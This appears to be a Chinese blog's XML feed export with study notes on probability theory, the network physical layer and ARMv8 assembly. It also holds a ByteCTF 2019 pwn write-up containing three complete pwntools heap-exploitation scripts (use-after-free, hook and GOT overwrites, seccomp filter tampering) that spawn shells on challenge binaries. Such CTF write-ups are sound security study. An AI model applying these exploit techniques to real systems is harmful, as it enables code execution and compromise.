    <content type="text"><![CDATA[前言随机试验的结果未必是数量的,为了数学处理的方便以及理论研究的需要,将随机试验的结果与实数对应起来,引入随机变量的概念. 随机变量作一个从样本空间到实数集的映射(函数),使样本从语言描述变成实数变量,从而将实验结果数量化. 针对实践中人们关心随机变量落入某个区间的概率,定义了分布函数的概念. 由分布函数的连续积分表达式定义出连续型随机变量的概率密度,使概率的求解转化为概率密度的定积分的计算. 随机变量设随机试验E的样本空间是S,若对于每一个e属于S,有一个实数X(e)与之对应,即X(e)是定义在S上的单值实函数,也称为随机变量(简记为r.v.).可用随机变量X描述事件. 随机变量随着试验的结果而取不同的值,在试验之前不能确切知道它取什么值,但是随机变量的取值有一定的统计规律性,即概率分布. 随机变量可分为离散型随机变量和非离散型随机变量. 离散型随机变量及其分布律若随机变量全部可能取到的值是有限多个或可列无限多个(即可数集,指能与自然数集N一一对应的集合),则称为离散型随机变量. 设离散型随机变量X所有可能取值为xk(k = 1, 2, ...),P(X = xk) = pk(k = 1, 2, ...). 任意pk大于等于0且所有pk之和为1. P(X = xk) = pk(k = 1, 2, ...)为离散型随机变量X的概率分布(律)或分布律. 概率分布或分布律也可以用表格表示. 退化分布 0-1分布 二项分布 当n较大,p又较小时,二项分布的计算比较困难,可以用Poisson分布近似计算. 泊松分布 泊松(Poisson)定理. 在定理的条件下,二项分布的极限分布是泊松分布.可以利用泊松分布近似计算二项分布. 几何分布进行重复独立试验,设每次试验成功的概率为p,失败的概率为q(等于1 - p),(0 &lt; p &lt; 1). 将试验进行到出现一次成功为止,以X表示所需的试验次数,则X的分布律为:P{X = k} = q^(k - 1)p,k = 1, 2, ....称为X服从参数为p的几何分布. 随机变量的分布函数对于非离散型r.v.,不能用分布律来描述它,需要考虑r.v.的取值落入一个区间的概率.如:P{X &lt;= x},P{x1 &lt;= X &lt;= x2}.为此引入随机变量的分布函数. 定义:设随机变量X,x为任意实数,则F(x) = P{X &lt;= x}称为X的分布函数. 无论是离散型r.v.还是非离散型r.v.,分布函数都可以描述其统计规律性. 随机变量的分布函数性质. 单调不减性:F(x)是单调不减函数. 规范性:0 &lt;= F(x) &lt;= 1,F(负无穷大) = 0,F(正无穷大) = 1. 右连续性:F(x)至多有可列个间断点,而在其间断点上也是右连续的,F(x + 0) = F(x). 重要公式. P{a &lt; X &lt;= b} = F(b) - F(a). P{X &gt; a} = 1 - F(a). P{X = a} = F(a + 0) - F(a - 0). 易知离散型随机变量的分布函数是阶梯函数. 连续型随机变量及其概率密度 关于连续型r.v.的几个重要结论 设X为连续型r.v.,X取任一指定的实数值a的概率均为0.即P{X = a} = 0. 计算连续随机变量在一段区间上的概率时,可以不必区分是开区间还是闭区间,求概率密度函数时也是如此. 一般提到一个随机变量的概率分布时,指的是分布函数.或者:当是离散随机变量时,指的是分布律;当是连续随机变量时,指的是其概率密度. 概率密度本身不代表概率,代表的是某区间的概率的大小关系,所以概率密度的值可以大于1. 几个常用的连续型r.v.分布均匀分布 指数分布 伽玛分布 正态分布 标准正态分布. 正态分布(也称为高斯分布,误差分布)的性质. 通过标准正态分布计算其它一切正态分布的概率. 标准正态分布的上分位点. 随机变量的函数的分布由已知的r.v.X的分布,去求得它的函数Y = g(X)的分布(g(.)是已知的连续函数).]]></content>
      <categories>
        <category>mathematics</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-rctf-2019-pwn]]></title>
    <url>%2Fposts%2F8802535a%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[CS-computer-network-物理层]]></title>
    <url>%2Fposts%2F8c951d14%2F</url>
    <content type="text"><![CDATA[基本概念物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流,物理层的作用是要尽可能地屏蔽掉不同传输媒体和通信手段的差异.物理层的协议也常称为物理层规程. 物理层所规定的传输媒体的四个特性. 机械特性:规定了DTE和DCE之间的连接方式,说明接口所用接线器的形状和尺寸,引线数目和排列等. 电气特性:规定了DTE和DCE之间接口电路上信号发生器与接收器之间的电气特性. 功能特性:规定了DTE和DCE之间包括数据传送,控制,定时和接地等几类引线的功能. 规程特性:规定了DTE和DCE之间接口电路所使用的规程,即信号时序的应答关系和操作过程的规则. DTE是数据终端设备,也就是具有一定的数据处理能力以及发送和接收数据能力的设备;数据电路端设备DCE的作用就是在DTE和传输线路之间提供信号变换和编码的功能,负责建立,保持和释放数据链路的连接. 数据通信基础 数据:运送消息的实体. 信号:数据的电气的或电磁的表现. 模拟信号:代表消息的参数的取值是连续的. 数字信号:代表消息的参数的取值是离散的. 码元:指在使用时间域(时域)的波形表示数字信号时代表不同离散数值的基本波形.在数字通信中,一个数字脉冲称为一个码元.使用单位时间内载波调制状态改变次数来表示.数字信号的基本单位称为码元. 模拟信号与数字信号经常相互转化,现实中采集的是模拟信号,转化为数字信号交由计算机处理. 信道 信道:一般用来表示向某一个方向传送信息的媒体. 单向通信(单工通信):只能有一个方向的通信而没有反方向的交互. 双向交替通信(半双工通信):通信的双方都可以发送信息,但不能双方同时发送(当然也就不能同时接收). 双向同时通信(全双工通信):通信的双方可以同时发送和接收信息. 基带信号(即基本频带信号):来自信源的信号,像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号. 基带调制:仅对基带信号的波形进行变换,使它能够与信道特性相适应.变换后的信号仍然是基带信号,这种过程称为绸码. 带通调制:使用载波进行调制,把基带信号的频率范围搬移到较高的频段,并转换为模拟信号,这样就能够更好地在模拟信道中传输(即仅在一段频率范围内能够通过信道). 带通信号:经过载波调制后的信号. 编码承载比特的信号在两个端系统适配器(也称网卡)之间的传输媒体上传输,为使信道有效传输和接收结点有效识别,先要将比特编码为信号,再传输.不同编码方式主要看信号时钟同步和编码效率. 不归零制:正电平代表1,负电平代表0. 归零制:正脉冲代表1,负脉冲代表0. 曼彻斯特编码:位周期中心的向上跳变代表0,位周期中心的向下跳变代表1,但也可反过来定义. 差分晏彻斯特编码:在每一位的中心处始终都有跳变,位开始边界有跳变代表0,而位开始边界没有跳变代表1. 曼彻斯特编码和差分曼彻斯特编码产生的信号频率比不归零制高;从自同步能力来看,不归零制不能从信号波形本身中提取信号时钟频率(没有自同步能力),而曼彻斯特编码和差分晏彻斯特编码具有自同步能力. 带通调制方法基带信号往往包含有较多的低频成分,甚至有直流成分,而许多信道并不能传输这种低频分量或直流分量,因此必须对基带信号进行调制.最基本的二元制调制方法有以下几种. 调幅(AM):载波的振幅随基带数字信号而变化. 调频(FM):载波的频率随基带数字信号而变化. 调相(PM):载波的初始相位随基带数字信号而变化. 为了达到更高的信息传输速率,必须采用技术上更为复杂的多元制的振幅相位混合调制方法:正交振幅调制QAM. 图例可供选择的相位有12种,而对于每一种相位有1或2种振幅可供选择,总共有16种组合(对应四个比特),即16个码元.可以看出每个码元可以用一组极坐标来描述.码元不是越多越好,若每一个码元可表示的比特数越多,则在接收端进行解调时要正确识别每一种状态就越困难,出错率增加. 信道的极限容量任何实际的信道都不是理想的,在传输信号时会产生各种失真以及带来多种干扰.码元传输的速率越高,或信号传输的距离越远,或传输媒体质量越差,在信道的输出端的波形的失真就越严重. 限制码元在信道上的传输速率(单位为波特,Baud,1波特为每秒传送1个码元)的因素. 信道能够通过的频率范围:具体的信道所能通过的频率范围总是有限的,信号中的许多高频分量往往不能通过信道. 信噪比. 在任何信道中,码元传输的速率是有上限的,否则就会出现码间串扰的问题,使接收端对码元的判决(即识别)成为不可能.任何实际的信道所能传输的最大数据传输速率受到奈奎斯特(Nyquist)公式限制.信道带宽W范围从0开始的(0-W),称为低通信道,不从0开始的称为带通信道. 理想低通信道的最高码元传输速率:2W Baud. 理想带通信道的最高码元传输速率:W Baud. 如果信道的频带越宽,也就是能够通过的信号高频分量多,那么就可以用更高的速率传送码元而不出现码间串扰.每码元的信息量越多,信道传输速率就越快. 物理层下面的传输媒体传输媒体也称为传输介质或传输媒介,它就是数据传输系统中在发送器和接收器之间的物理通路.传输媒体可分为两大类,即导引型传输媒体和非导引型传输媒体. 在导引型传输媒体中,电磁波被导引沿着固体媒体(铜线或光纤)传播. 非导引型传输媒体就是指自由空间.在非导引型传输媒体中,电磁波的传输常称为无线传输. 导引型传输媒体双绞线双绞线是最常用的传输媒体,可用于模拟传输和数字传输,通信距离一般为几到十几公里.分为屏蔽双绞线STP和无屏蔽双绞线UTP.EIA/TIA-568-A标准规定了5种UTP标准(从1类线到5类线),对传送数据来说,现在最常用的UTP是5类线(Category 5或CAT5). 双绞线标准.10Base-T中10是指数据传输速率10Mbps.Base是指基带,T表示双绞线,指用于该网络的电缆. 同轴电缆同轴电缆具有很好的抗干扰特性,被广泛用于传输较高速率的数据,同轴电缆的带宽取决于电缆的质量. 50欧姆同轴电缆:LAN/数字传输常用. 75欧姆同轴电缆:有线电视/模拟传输. 光纤光纤是光纤通信的传输媒体,由于可见光的频率非常高,约为10^8MHz,因此一个光纤通信系统的传输带宽远远大于目前其他各种传输媒体的带宽.光纤传输系统的组成部分:光纤,光源,检测器. 当光线从高折射率的媒体射向低折射率的媒体时,其折射角将大于入射角.因此,如果入射角足够大,就会出现全反射,光也就沿着光纤传输下去,光线在纤芯中传输的方式是不断地全反射.双向传输需两根光纤. 多模光纤:可以存在多条不同角度入射的光线在一条光纤中传输. 单模光纤:光纤的直径减小到只有一个光的波长,则光纤就像一根波导那样,它可使光线一直向前传播,而不会产生多次反射. 光纤通信常用的三个波段的中心分别位于850nm,1300nm和1550nm.所有这三个波段都具有25000-30000GHz的带宽.光纤的优点:通信容量非常大;传输损耗小,中继距离长;抗雷电和电磁干扰性能好;无串音干扰,保密性好;体积小,重量轻. 非导引型传输媒体将自由空间称为非导引型传输媒体,无线传输所使用的频段很广. 短波通信(即高频通信)主要是靠电离层的反射,但短波信道的通信质量较差,传输速率低;微波在空间主要是直线传播,传统微波通信有两种方式,地面微波接力通信和卫星通信. 无线局域网:要使用某一段无线电频谱进行通信,通常必须得到本国政府有关无线电频谱管理机构的许可证.有一些无线电频段是可以自由使用的,例如ISM,各国的ISM标准有可能略有差别. 红外线红外线是一种点对点的数据传输协议,是传统的设备之间连接线缆的替代,通讯距离一般在0到1米之间,传输速率最快可达16Mbps,波长为900纳米左右. 缺点:通讯距离短,通讯过程中不能移动,遇障碍物通讯中断,SIR标准通讯速率较低(115.2kbit/s).其主要目的是取代线缆连接进行无线数据传输,功能单一,扩展性差. 应用:笔记本电脑,台式电脑和手持电脑;打印机,键盘鼠标等计算机外围设备;电话机,移动电话,数码相机,计算器,游戏机,机顶盒,手表;工业设备和医疗设备. 信道复用技术复用即允许用户使用一个共享信道进行通信,从而降低成本,提高利用率. 实例频分复用FDM:将整个带宽分为多份,用户在分配到一定的频带后,在通信过程中自始至终都占用这个频带.频分复用的所有用户在同样的时间占用不同(频率)的带宽资源. 时分复用TDM:将时间划分为一段段等长的时分复用帧(TDM帧),每一个时分复用的用户在每一个TDM帧中占用固定序号的时隙.每一个用户所占用的时隙周期性地出现.TDM信号也称为等时信号.时分复用的所有用户在不同的时间占用同样的频带宽度. 统计时分复用STDM:STDM帧不是固定分配时隙,而是按需动态地分配时隙. 波分复用WDM:即光的频分复用. 码分复用码分复用CDM,也称为码分多址CDMA,用于无线广播信道中,如蜂窝,卫星. 各用户使用经过特殊挑选的不同码型,同频,同时使用,彼此干扰很小.这种系统发送的信号有很强的抗干扰能力,其频谱类似于白噪声,不易被敌人发现. 码片序列:每一个比特时间划分为m个短的间隔,称为码片(chip),每个站被指派一个唯一的m bit码片序列. 如发送比特1,则发送该码片序列. 如发送比特0,则发送该码片序列的二进制反码. 假定S站要发送信息的数据率为b bit/s,由于每一个比特要转换成m个比特的码片,因此S站实际上发送的数据率提高到mb bit/s,同时S站所占用的频带宽度也提高到原来数值的m倍.这种通信方式是扩频通信中的一种.扩频通信通常有两类:直接序列扩频DSSS,码片序列就是这一类;跳频扩频FHSS. 每个站分配的码片序列不仅必须各不相同，并且还必须互相正交,令向量S表示站S的码片向量(0011对应向量(-1 -1 1 1)),令T表示其他任何站的码片向量.两个不同站的码片序列正交就是向量S和T的规格化内积为0.而任何一个码片向量和该码片向量自己的规格化内积都是1,一个码片向量和该码片反码的向量的规格化内积值是-1. 数字传输系统时分复用PCM脉码调制PCM技术将模拟信号转变为数字信号,PCM先对模拟信号进行采样,这里存在一个采样定理:要不失真的还原原始信号,采样频率不能低于信号最高频率的2倍. 电话信号的例子:最高频率为3.4kHz,采样频率要大于6.8kHz,采样的标准定为8kHz,即采样周期为125µs, 每次采样,获得8bit,PCM信号的基本速率为64kbps. PCM有两个互不相容的国际标准:北美的24路PCM(简称为T1),欧洲的30路PCM(简称为E1).我国采用的是欧洲的E1标准.E1时分复用帧的构成:每时隙8bit,32路共用256bit,每秒传送8000个帧,PCM E1一次群的数据率就是2.048Mbps,可再次复用,支持传输更高的数据率.北美使用的T1系统共有24路,速率1.544Mbps. 同步光纤网SONET与SDH同步光纤网SONET的各级时钟都来自于一个非常精准的主时钟.SONET为光纤传输系统定义了同步传输的线路速率等级结构.对电信号称为第1级同步传送信号STS-1,其传输速率是51.84Mbit/s.对光信号则称为第1级光载波OC-1.现已定义了从51.84Mbit/s(即OC-1)一直到9953.280Mbit/s(即OC-192/STS-192)的标准. ITU-T以美国标准SONET为基础,制订出国际标准同步数字系列SDH,可认为SDH与SONET是同义词.SDH基本速率为155.52Mbit/s,称为第1级同步传递模块STM-1,相当于SONET体系中的OC-3速率. SONET/SDH标准的意义:使不同的数字传输体制在STM-1等级上获得了统一,第一次真正实现了数字传输体制上的世界性标准,已成为公认的新一代理想的传输网体制,SDH标准也适合千微波和卫星传输的技术体制. 宽带接入技术用户要连接到互联网,必须先连接到某个ISP,在互联网的发展初期,用户都是利用电话的用户线通过调制解调器连接到ISP的,电话用户线接入到互联网的速率最高仅达到56 kbit/s. 从宽带接入的媒体来看,可以划分为两大类:有线宽带接入,无线宽带接入. 非对称数字用户线ADSL非对称数字用户线ADSL技术就是用数字技术对现有的模拟电话用户线进行改造,使它能够承载宽带业务. 标准模拟电话信号的频带被限制在300-3400Hz的范围内,但用户线本身实际可通过的信号频率仍然超过1MHz.ADSL技术把0-4kHz低端频谱留给传统电话使用,而把原来没有被利用的高端频谱留给用户上网使用. 数字用户线DSL的类型:ADSL非对称数字用户线,HDSL高速数字用户线,SDSL一对线的数字用户线,VDSL甚高速数字用户线,DSL数字用户线,RADSL速率自适应数字用户线,是ADSL的一个子集,可自动调节线路速率. ADSL的传输距离取决于数据率和用户线的线径(用户线越细,信号传输时的衰减就越大).ADSL所能得到的最高数据传输速率与实际的用户线上的信噪比密切相关. ADSL的特点:上行和下行带宽是不对称的,上行指从用户到ISP,下行指从ISP到用户.ADSL在用户线的两端各安装一个ADSL调制解调器. 离散多音调(多子信道)DMT调制技术. DMT调制技术采用频分复用的方法把,40kHz以上一直到1.1MHz的高端频谱划分为许多子信道,其中25个子信道用于上行信道,249个子信道用于下行信道.每个子信道占据4kHz带宽(4.3125kHz)并使用不同的载波进行数字调制.这种做法相当于在一对用户线上使用许多小的调制解调器并行地传送数据. ADSL2(G.992.3和G.992.4)和ADSL2+(G.992.5)通过提高调制效率得到更高的数据率.ADSL2要求至少支持下行8Mbit/s,上行800kbit/s的速率.ADSL2+则将频谱范围从1.1MHz扩展至2.2MHz,下行速率可达16Mbit/s(最大传输速率可达25Mbit/s),而上行速率可达800kbit/s. 采用无缝速率自适应技术SRA可在运营中不中断通信和不产生误码的情况下,自适应调整数据率.改善了线路质量评测和故障定位功能,这对提高网络的运行维护水平具有非常重要的意义. 光纤同轴混合网HFC光纤同轴混合网HFC网是在目前覆盖面很广的有线电视网CATV的基础上开发的一种居民宽带接入网.HFC网除可传送CATV外,还提供电话,数据和其他宽带交互型业务. 现有的CATV网是树形拓扑结构的同轴电缆网络,它采用模拟技术的频分复用对电视节目进行单向传输,HFC网对CATV网进行了双向通信的改造. HFC网将原CATV网中的同轴电缆主干部分改换为光纤并使用模拟光纤技术,在模拟光纤中采用光的振幅调制AM,比使用数字光纤更为经济. 用户接口盒用户接口盒UIB提供三种连接. 使用同轴电缆连接到机顶盒,然后再连接到用户的电视机. 使用双绞线连接到用户的电话机. 使用电缆调制解调器连接到用户的计算机. 电缆调制解调器是为HFC网而使用的调制解调器,电缆调制解调器最大的特点就是传输速率高.电缆调制解调器比在普通电话线上使用的调制解调器要复杂得多,并且只安装在用户端。]]></content>
      <categories>
        <category>CS</category>
        <category>computer-network</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-assembly-ARM-ARMv8]]></title>
    <url>%2Fposts%2F165ef9ad%2F</url>
    <content type="text"><![CDATA[ARMv8ARMv8的架构继承以往ARMv7与之前处理器技术的基础,除了现有的16/32bit的Thumb2指令支持外,也向前兼容现有的A32(ARM 32bit)指令集,称为AArch32,引入了64bit的AArch64架构. 除了新增A64(ARM 64bit)指令集外,也扩充了现有的A32(ARM 32bit)和T32(Thumb2 32bit)指令集(二者统称AArch32 ISA),另外还新增加了CRYPTO(加密)模块支持。 ARMv8提供AArch32 state和AArch64 state两种Execution State. ARMv8新增了两种模式:hyp,用于虚拟化扩展;monitor,用于Security扩展. 异常级别Armv8架构定义了四个异常级别EL0 ~ EL3:EL0对应应用程序,EL1对应操作系统内核,EL2对应Hypervisor,EL3对应安全监控模式,实现EL0和EL1的Secure和Non-Secure之间的切换,可起到物理屏障安全隔离作用. 发生异常时可以保留异常级别或者提升异常级别,从异常退出可以保留异常级别或者降低异常级别. 当从低异常级别陷入高异常级别,可以保持执行状态也可以从AArch32变为AArch64. 当从高异常级别返回低异常级别,可以保持执行状态也可以从AArch64变为AArch32. 模式与异常等级之间的关系 user模式:只能在EL0执行. monitor模式:只能在Secure的EL3执行. hyp模式:只能在Non-Secure的EL2执行,虚拟机. system,supervisor,abort,undefined,IRQ,FIQ模式:依赖于Secure模式. Execution StateAArch32 state提供13个32bit通用寄存器R0 - R12,一个32bit的PC指针(R15),堆栈指针SP(R13),链接寄存器LR(R14).提供一个32bit异常链接寄存器ELR,用于hyp mode下的异常返回. 提供32个64bit的SIMD向量和标量floating-point支持.提供两个指令集A32,T32.兼容ARMv7的异常模型.协处理器只支持CP10\CP11\CP14\CP15. AArch64 state提供31个64bit通用寄存器X0 - X30(W0 - W30),其中X30是程序链接寄存器LR.提供一个64bit的PC指针,堆栈指针SPx,异常链接寄存器ELRx. 提供32个128bit的SIMD向量和标量floating-point支持.定义ARMv8异常等级ELx.定义一组PE state寄存器PSTATE(NZCV/DAIF/CurrentEL/SPSel等),用于保存PE当前的状态信息.没有协处理器概念. 决定Execution State的条件SPSR_EL1.M[4]决定EL0的执行状态,为0 =&gt; 64bit,1 =&gt; 32bit. HCR_EL2.RW决定EL1的执行状态,为1 =&gt; 64bit,0 =&gt; 32bit. SCR_EL3.RW确定EL2或EL1的执行状态,为1 =&gt; 64bit,0 =&gt; 32bit. AArch32和AArch64之间的切换只能通过发生异常或者系统Reset来实现.(A32与T32之间是通过BX指令切换的). AArch64寄存器AArch64有31个通用的64位寄存器,系统运行在64位状态下的时候名字叫Xn,运行在32位的时候就叫Wn.32个128bits浮点寄存器(v0 - v31),可以通过Bn(8位),Hn(16位),Sn(32位),Dn(64位),Qn(128位)来访问不同的位数. 还有4个堆栈指针寄存器SP_EL0,SP_EL1,SP_EL2,SP_EL3(64位,还有32位的WSP).3个异常链接寄存器ELR_EL1,ELR_EL2,ELR_EL3(64位).3个存储状态寄存器SPSR_EL1,SPSR_EL2,SPSR_EL3(32位).状态寄存器CPSR.一个程序计数器PC(64位).还有Zero register(WZR 32bits,XZR 64bits). 当在指令中使用32位的寄存器时,源寄存器高32位会被忽略,目的寄存器高32位置零. 通用寄存器分为4组. 参数寄存器(X0 - X7):用作临时寄存器或可以保存的调用者保存的寄存器变量函数内的中间值,调用其他函数之间的值(可用于传递参数). 调用者保护寄存器(X9 - X15):如果调用者要求在任何这些寄存器中保留值调用另一个函数,调用者必须将受影响的寄存器保存在自己的堆栈中.它们可以通过被调用的子程序进行修改,而无需保存并在返回调用者之前恢复它们. 被调用者保存的寄存器(X19 - X29):这些寄存器保存在被调用者帧中,它们可以被被调用者修改子程序,只要它们在返回之前保存并恢复. 特殊用途寄存器(X8,X16 - X18,X29,X30). X8:是间接结果寄存器,用于保存子程序返回地址,尽量不使用. X16和X17:程序内调用临时寄存器. X18:平台寄存器,保留用于平台ABI,尽量不使用. X29:帧指针寄存器(FP),指向当前栈帧栈底. X30:链接寄存器(LR),存储着函数的返回地址. X31:堆栈指针寄存器SP或零寄存器XZR. 链接寄存器AArch64状态有两种链接寄存器:LR和ELR.通常LR(X30)用来存储子程序的返回地址,ELR通常在陷入异常(出现级别提升)时用来存储返回地址,例如EL0到EL1时返回地址就会存储在ELR_EL1.同一异常级别的子程序调用的返回地址存储在LR. A64指令集AArch64指令集特点. 移除了LDM/STM,PUSH/POP,使用STP/LDP代替. 没有提供访问CPSR的单一寄存器,但是提供访问PSTATE的状态域寄存器. 没有协处理器的概念,没有协处理器指令MCR,MRC. 少了很多条件执行指令,只有条件跳转和少数数据处理这类指令才有条件执行. 指令格式. 1234567&lt;Opcode&gt;&#123;&lt;Cond&gt;&#125;&lt;S&gt; &lt;Rd&gt;, &lt;Rn&gt;&#123;, &lt;Opcode2&gt;&#125;#Opcode:助记符#Cond:指令执行条件码#S:条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值#Rd/Xt:目标寄存器.A32指令可以选择R0-R14,T32指令大部分只能选择RO-R7,A64指令可以选择X0-X30#Rn/Xn:第一个操作数的寄存器,同上,不同指令有不同要求；#Opcode2:第二个操作数,可以是立即数,寄存器Rm和寄存器移位方式(Rm, #shit) 加载指令. 123456LDR Rt, &lt;addr&gt;LDRB(8-bit, zero extended).LDRSB(8-bit, sign extended).LDRH(16-bit, zero extended).LDRSH(16-bit, sign extended).LDRSW(32-bit, sign extended). 存储指令 12STR Rn, &lt;addr&gt;;同LDR]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-bytectf-2019-quals-pwn]]></title>
    <url>%2Fposts%2F39083382%2F</url>
    <content type="text"><![CDATA[mulnoteOllvm混淆,漏洞在free的时候,thread中sleep了10秒导致UAF. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *def add(size, content): r.sendlineafter("&gt;", "C") r.sendlineafter("size&gt;", str(size)) r.sendafter("note&gt;", content)def show(): r.sendlineafter("&gt;", "S")def dele(index): r.sendlineafter("&gt;", "R") r.sendlineafter("index&gt;", str(index))def edit(index, content): r.sendlineafter("&gt;", "E") r.sendlineafter("index&gt;", str(index)) r.sendafter("note&gt;", content)libc = ELF("./libc.so", checksec = False)# elf = ELF("./mulnote", checksec = False)r = process("./mulnote")add(0x68,"A")add(0x68,"A")add(0x100,"A")add(0x10,"A")dele(0)dele(1)dele(2)add(0x68,"A")show()r.recvuntil("1]:\n")heap = u64(r.recv(6).ljust(8, '\x00')) - 0x41r.recvuntil("2]:\n")libc.address = u64(r.recv(6).ljust(8, '\x00')) - 0x3c4b78add(0x68,"A")dele(4)dele(0)edit(0, p64(libc.symbols["__malloc_hook"] - 0x23))add(0x68, "A")add(0x68, "\x00" * 0x13 + p64(libc.address + 0x4526a))sleep(15)r.sendlineafter('&gt;', 'C')r.sendlineafter('size&gt;', str(0x20))#gdb.attach(r)print "libc: " + hex(libc.address)print "heap: " + hex(heap)r.interactive() mheap程序定义了自己的chunk. 12345struct chunk &#123; size_t size; struct chunk * next; char buf[size];&#125; 由于使用的是mmap的地址,大量申请内存使read读取数据时触发缺页异常导致read返回-1,从而向前写已free的chunk的next指针. 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *def add(index, size, content): r.sendlineafter("Your choice: ", "1") r.sendlineafter("Index: ", str(index)) r.sendlineafter("Input size: ", str(size)) r.sendafter("Content: ", content)def show(index): r.sendlineafter("Your choice: ", "2") r.sendlineafter("Index: ", str(index))def dele(index): r.sendlineafter("Your choice: ", "3") r.sendlineafter("Index: ", str(index))def edit(index, content): r.sendlineafter("Your choice: ", "4") r.sendlineafter("Index: ", str(index)) r.send(content)libc = ELF("./libc-2.27.so", checksec = False)elf = ELF("./mheap", checksec = False)r = process("./mheap")add(0, 0xfb0, "A" * 0x10 + "\n")add(0, 0x10, "A" * 0x10)dele(0)add(1, 0x60, p64(0x00000000004040d0) + 'A' * 0x2f + "\n")add(0, 0x23330fb0, "A" * 0x8 + p64(elf.got["atoi"]) * 2 + "\n")show(1)libc.address = u64(r.recv(6).ljust(8,'\x00')) - libc.symbols["atoi"]edit(1, p64(libc.symbols["system"]) + "\n")r.sendlineafter("Your choice: ", "/bin/sh\x00")print "libc : " + hex(libc.address)r.interactive() vipedit存在堆溢出,但是输入会被/dev/urandom数据覆写,同时vip函数中存在溢出,可以覆写sock_filter,将open(&quot;/dev/random&quot;, 0)的返回值改为ERRNO(0)从而使fd = 0. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *def alloc(index): r.sendlineafter("choice: ", "1") r.sendlineafter("Index: ", str(index))def show(index): r.sendlineafter("choice: ", "2") r.sendlineafter("Index: ", str(index))def dele(index): r.sendlineafter("choice: ", "3") r.sendlineafter("Index: ", str(index))def edit(index, size, content): r.sendlineafter("choice: ", "4") r.sendlineafter("Index: ", str(index)) r.sendlineafter("Size: ", str(size)) r.sendafter("Content: ", content)def become_vip(name): r.sendlineafter("choice: ", "6") r.sendafter("name: ", name)elf = ELF('./vip')libc = ELF('./libc-2.27.so')r = process("./vip")payload = "a" * 0x20 + "\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01\x7e\x20\x40\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f"become_vip(payload)for x in range(4): alloc(x)dele(1)edit(0, 0x68, "A" * 0x50 + p64(0) + p64(0x61) + p64(0x404100))alloc(1)alloc(0xf)edit(0xf, 8, p64(elf.got['free']))show(0)libc.address = u64(r.recvline(keepends = False).ljust(8, '\x00')) - libc.sym['free']edit(0xf, 0x10, p64(libc.sym['__free_hook']) + p64(libc.search('/bin/sh').next()))edit(0, 8, p64(libc.sym['system']))dele(1)print "libc : " + hex(libc.address)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mathematics-probability-theory-基本概念]]></title>
    <url>%2Fposts%2F77448d89%2F</url>
    <content type="text"><![CDATA[前言概率论是研究如何定量描述随机现象及其规律的一门学科. 随机现象:在个别试验中其结果呈现出不确定性,在大量重复试验中结果具有统计规律性. 随机实验随机试验:可在相同的条件下重复进行;每次试验的结果不止一个,且能事先明确所有可能的结果;一次试验前不能确定会出现哪个结果. 实际推断原理:小概率事件在一次试验中实际上是不可能发生的.同时,在大量重复实验中小概率事件的发生是必然的. 样本空间样本空间(集合论):随机试验E的所有可能结果组成的集合称为E的样本空间,记为S.样本空间的元素称为样本点,用e表示. 样本空间的分类:离散样本空间,样本点为有限多个或可列多个;无穷样本空间,样本点在区间或区域内取值. 随机事件(元素)随机事件:样本空间S的子集称为随机事件,简称事件.在一次试验中,当且仅当这一子集中的一个样本点出现时,称这一事件发生. 基本事件:由一个样本点组成的单点集. 复合事件:由两个或两个以上的基本事件复合而成的事件为复合事件. 样本空间S是自身的子集,在每次试验中总是发生的,称为必然事件. 空集Φ不包含任何样本点,它在每次试验中都不发生,称为不可能事件. 事件间的关系与运算集合间的关系与运算对应事件之间的包含,相等关系,和事件(并),积事件(交)和差事件. 如果事件A,B交集为空集,则A,B互不相容(互斥).基本事件是两两互不相容的,即样本点是互不相容的. 对于互不相容的事件A与B,称它们的并为和,记作A + B. 对立事件(逆事件):若A,B互斥,同时A + B = S.则称A,B为对立事件(逆事件).A的对立事件即S - A(非A). 事件运算满足集合的运算律:交换律,分配律,对偶律(德摩根律). 频率与概率频率频率:在相同条件下,进行了n次试验,事件A发生的次数nA,称为A的频数,nA/n称为事件A发生的频率,记为fn(A). 频率的基本性质:非负性(1 &gt;= fn(A) &gt;= 0),规范性(fn(S) = 1),有限可加性(对于有限个两两互不相容的事件,其和事件的频率为各事件频率之和). 频率的特性:波动性和稳定性.实现次数少时体现较强的波动性,实现次数多时体现较强的稳定性. 概率概率的统计性定义:当试验的次数增加时,随机事件A发生的频率的稳定值p称为概率,记为P(A) = p. 概率的公理化定义:设S是样本空间,E是随机试验.对于E的每个事件A对应一个实数P(A),称为事件A的概率,其中集合函数P(.). 概率的基本性质:非负性(1 &gt;= P(A) &gt;= 0),规范性(P(S) = 1),有限可加性(对于有限个两两互不相容的事件,其和事件的概率为各事件概率之和). 概率的性质. P(Φ) = 0; 对立事件概率之和为一; 对于互有包含关系的事件,若B包含A,P(B - A) = P(B) - P(A),同时P(B) &gt; P(A). 任意两事件A,B,P(A U B) = P(A) + P(B) - P(AB)(所以互斥事件存在有限可加性). 任意多个事件的和事件的概率计算公式. 等可能概型(古典概型)等可能概型的两个特点:样本空间中的元素只有有限个;试验中每个基本事件发生的可能性相同. 概率的古典概型定义:对于古典概型,样本空间S = {x1, x2, ..., xn},设事件A包含S的k个样本点,则事件A的概率定义为:P(A) = k / n. 古典概型两大原理. 加法原理:完成一件工作,有m类方法,而第1类方法有n1种方法,第2类方法有n2种方法,…,第m类方法有nm种方法,任选一种此工作就完成,那么完成这项工作共有N = n1 + n2 + ... + nm种不同的方法. 